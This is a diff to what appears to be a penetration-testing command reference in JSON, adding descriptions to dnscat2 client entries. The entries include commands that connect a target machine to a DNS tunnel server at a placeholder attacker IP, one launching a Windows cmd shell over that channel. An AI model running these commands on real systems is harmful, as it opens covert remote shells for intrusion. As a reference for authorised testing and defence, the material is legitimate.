@@ -100,17 +100,20 @@
     {
       "command": "./dnscat --secret=<secret> <domain>",
       "caption": "Linux dnscat2 client: connect to server by domain",
-      "label": "dnscat client - via domain (NS)"
+      "label": "dnscat client - via domain (NS)",
+      "description": "Dnscat client - via domain (NS). See the command syntax for exact parameters and flags."
     },
     {
       "command": "./dnscat --dns server=<attacker_ip>,port=53 --secret=<secret>",
       "caption": "Linux dnscat2 client: connect directly to server IP",
-      "label": "dnscat client - direct to server"
+      "label": "dnscat client - direct to server",
+      "description": "Dnscat client - direct to server. See the command syntax for exact parameters and flags."
     },
     {
       "command": "Import-Module .\\dnscat2.ps1\nStart-Dnscat2 -DNSserver <attacker_ip> -Domain <domain> -PreSharedSecret <secret> -Exec cmd",
       "caption": "PowerShell dnscat2 client (Windows target)",
-      "label": "Import-Module"
+      "label": "Import-Module",
+      "description": "Loads a PowerShell module into the current session. Makes the module's cmdlets available for use - commonly used to load offensive tools like PowerView, PowerUp, or custom scripts."
     }
   ],
   "defense": {
